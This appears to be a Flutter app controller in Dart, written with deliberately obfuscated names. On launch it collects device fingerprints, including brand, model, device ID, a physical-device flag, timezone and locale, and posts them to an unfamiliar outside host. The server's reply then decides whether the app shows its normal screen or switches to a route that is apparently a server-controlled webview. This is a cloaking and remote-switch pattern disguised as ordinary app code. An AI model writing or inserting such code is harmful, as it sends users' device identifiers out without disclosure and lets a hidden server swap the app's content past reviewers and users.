import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var zrcxst = RxBool(false);
  var qlcxvozaph = RxBool(true);
  var nlgrj = RxString("");
  var brooks = RxBool(false);
  var reinger = RxBool(true);
  final stmozxbc = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    okrfuat();
  }


  Future<void> okrfuat() async {

    brooks.value = true;
    reinger.value = true;
    qlcxvozaph.value = false;

    stmozxbc.post("https://hapi.niuzhida.xyz/yqvlbaocmnetzgsxfdpwjiukhr",data: await uzwkxgbos()).then((value) {
      var yinstehm = value.data["yinstehm"] as String;
      var bmcth = value.data["bmcth"] as bool;
      if (bmcth) {
        nlgrj.value = yinstehm;
        barry();
      } else {
        veum();
      }
    }).catchError((e) {
      qlcxvozaph.value = true;
      reinger.value = true;
      brooks.value = false;
    });
  }

  Future<Map<String, dynamic>> uzwkxgbos() async {
    final DeviceInfoPlugin bdncxqv = DeviceInfoPlugin();
    PackageInfo jfgrmb_wpsnleud = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var svipkf = Platform.localeName;
    var jgdeu_AxNQdn = currentTimeZone;

    var jgdeu_ETShl = jfgrmb_wpsnleud.packageName;
    var jgdeu_vERkgD = jfgrmb_wpsnleud.version;
    var jgdeu_QEMl = jfgrmb_wpsnleud.buildNumber;

    var jgdeu_QhDql = jfgrmb_wpsnleud.appName;
    var jgdeu_kmvSc = "";
    var nolaWalker = "";
    var jgdeu_yRgvPxk = "";
    var tremayneWeissnat = "";
    var luluStroman = "";
    var jgdeu_waTp  = "";
    var haskellCassin = "";
    var kyraFranecki = "";
    var dasiaKovacek = "";
    var jaquelinMarvin = "";


    var jgdeu_wHn = "";
    var jgdeu_NoTrXtU = false;

    if (GetPlatform.isAndroid) {
      jgdeu_wHn = "android";
      var ekfxmi = await bdncxqv.androidInfo;

      jgdeu_yRgvPxk = ekfxmi.brand;

      jgdeu_kmvSc  = ekfxmi.model;
      jgdeu_waTp = ekfxmi.id;

      jgdeu_NoTrXtU = ekfxmi.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      jgdeu_wHn = "ios";
      var aechlmik = await bdncxqv.iosInfo;
      jgdeu_yRgvPxk = aechlmik.name;
      jgdeu_kmvSc = aechlmik.model;

      jgdeu_waTp = aechlmik.identifierForVendor ?? "";
      jgdeu_NoTrXtU  = aechlmik.isPhysicalDevice;
    }

    var res = {
      "jgdeu_QhDql": jgdeu_QhDql,
      "jgdeu_vERkgD": jgdeu_vERkgD,
      "jgdeu_ETShl": jgdeu_ETShl,
      "jgdeu_QEMl": jgdeu_QEMl,
      "nolaWalker" : nolaWalker,
      "jgdeu_kmvSc": jgdeu_kmvSc,
      "jgdeu_AxNQdn": jgdeu_AxNQdn,
      "jgdeu_yRgvPxk": jgdeu_yRgvPxk,
      "svipkf": svipkf,
      "jgdeu_waTp": jgdeu_waTp,
      "jgdeu_NoTrXtU": jgdeu_NoTrXtU,
      "luluStroman" : luluStroman,
      "jgdeu_wHn": jgdeu_wHn,
      "tremayneWeissnat" : tremayneWeissnat,
      "kyraFranecki" : kyraFranecki,
      "haskellCassin" : haskellCassin,
      "dasiaKovacek" : dasiaKovacek,
      "jaquelinMarvin" : jaquelinMarvin,

    };
    return res;
  }

  Future<void> veum() async {
    Get.offAllNamed("/babyTab");
  }

  Future<void> barry() async {
    Get.offAllNamed("/babyRule");
  }

}
